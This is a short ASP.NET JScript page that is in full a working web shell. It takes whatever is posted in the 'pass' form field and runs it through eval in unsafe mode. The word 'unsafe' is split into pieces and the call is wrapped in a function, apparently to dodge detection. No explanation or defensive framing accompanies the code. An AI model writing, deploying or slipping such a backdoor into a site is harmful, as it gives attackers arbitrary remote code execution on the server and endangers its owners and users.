<%@ Page Language="Jscript" Debug=true%>
<%
var a=Request.Form["pass"];
var b="unsa",c="fe",d=b+c;
function fun()
{
return a;
}
eval(fun(),d);
%>